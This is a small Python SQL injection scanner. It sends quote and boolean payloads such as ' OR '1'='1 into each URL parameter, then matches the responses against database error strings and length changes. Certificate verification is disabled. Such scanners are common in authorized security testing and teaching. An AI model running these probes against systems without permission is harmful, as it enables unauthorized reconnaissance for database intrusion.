import sys
from urllib.parse import parse_qs, urlencode, urlparse
import requests

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# List of DB Error signatures
SQL_ERRORS = [
    "you have an error in your sql syntax",
    "warning: mysql",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "pg_query(): query failed",
    "sqlite3::sqlexception",
    "ora-00933",
    "microsoft ole db provider for odbc drivers error",
]

# Basic testing payloads
PAYLOADS = [
    ("Error-Based Single Quote", "'"),
    ("Error-Based Double Quote", '"'),
    ("Boolean-Based True", "' OR '1'='1"),
    ("Boolean-Based False", "' OR '1'='2"),
]


def scan_sqli(url):
    parsed_url = urlparse(url)
    params = parse_qs(parsed_url.query)

    if not params:
        print("[!] No URL parameters found to test! (e.g. Needs ?id=1)")
        return

    headers = {"User-Agent": "Ammar-SQLi-Scanner/1.0"}

    print("\n" + "=" * 60)
    print(f"[*] Starting SQLi Scan on Target: {url}")
    print("=" * 60 + "\n")

    # Send baseline request for comparison
    try:
        baseline_res = requests.get(url, headers=headers, timeout=5, verify=False)
        baseline_len = len(baseline_res.text)
    except requests.RequestException as e:
        print(f"[!] Connection failed: {e}")
        return

    vulnerable = False

    for param_name in params:
        print(f"[*] Testing Parameter: [{param_name}]")

        for payload_type, payload in PAYLOADS:
            # Inject payload into current parameter
            test_params = params.copy()
            test_params[param_name] = payload

            # Rebuild URL
            query_string = urlencode(test_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{query_string}"

            try:
                res = requests.get(test_url, headers=headers, timeout=5, verify=False)
                res_text = res.text.lower()

                # Check 1: Error-Based Detection
                for db_err in SQL_ERRORS:
                    if db_err in res_text:
                        print(
                            f"[🔥] VULNERABLE! [Type: Error-Based SQLi] via parameter '{param_name}'"
                        )
                        print(f"    Payload: {payload}")
                        print(f"    Matched Error: {db_err}")
                        vulnerable = True
                        break

                # Check 2: Boolean-Based Detection (Length anomaly)
                if (
                    "Boolean" in payload_type
                    and abs(len(res.text) - baseline_len) > 50
                ):
                    print(
                        f"[⚡] POTENTIAL VULNERABILITY! [Type: {payload_type}] via parameter '{param_name}'"
                    )
                    print(f"    Payload: {payload}")
                    vulnerable = True

            except requests.RequestException:
                continue

    if not vulnerable:
        print("\n[-] No obvious SQL Injection vulnerabilities detected.")


def main():
    print("=== Automated SQL Injection Scanner ===")
    url = input("Enter Full URL (e.g. http://testphp.vulnweb.com/artists.php?artist=1): ").strip()

    if url:
        scan_sqli(url)
    else:
        print("[!] URL cannot be empty.")


if __name__ == "__main__":
    main()